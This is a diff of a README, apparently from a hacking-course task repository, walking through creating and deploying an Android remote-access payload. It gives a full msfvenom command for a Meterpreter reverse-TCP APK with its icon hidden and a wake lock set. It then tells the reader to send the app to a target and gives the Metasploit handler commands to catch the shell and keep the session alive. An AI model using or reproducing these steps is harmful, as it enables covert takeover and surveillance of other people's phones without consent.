@@ -31,14 +31,15 @@ reference - ["https://medium.com/@leandro.almeida/setoolkit-fake-facebook-site-e
   1. open terminal and start msfconsole
   2. run to create payload `msfvenom -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidWakeLock=true LHOST=eth0 LPORT=6996 -f raw -o TechnojamHack.apk` to create apk file 
   3. send the app to the target 
-  4. for listening for use 
-    - use exploit/multi/handler
-    - set PAYLOAD android/meterpreter/reverse_tcp
-    - set LHOST eth0
-    - set LPORT 6996
-    - exploit
+  4. for listening for use
+    1. use exploit/multi/handler
+    2. set PAYLOAD android/meterpreter/reverse_tcp
+    3. set LHOST eth0
+    4. set LPORT 6996
+    5. exploit
   5. wait for the target to install the app this app will not show in the home app list 
-    <img src="https://github.com/rishabhjainfinal/technojam-task/blob/main/task_12/readme_req/2-results2.PNG" alt="default" width="700" >
+    <img src="https://github.com/rishabhjainfinal/technojam-task/blob/main/task_12/readme_req/2-install.png" alt="default" width="700" >
   6. we can use lifelong script to keen running the session  
+    <img src="https://github.com/rishabhjainfinal/technojam-task/blob/main/task_12/readme_req/2-results2.PNG" alt="default" width="700" >
 
 reference - ["https://www.hackers-arise.com/post/2018/07/06/metasploit-basics-part-13-exploiting-android-mobile-devices"]
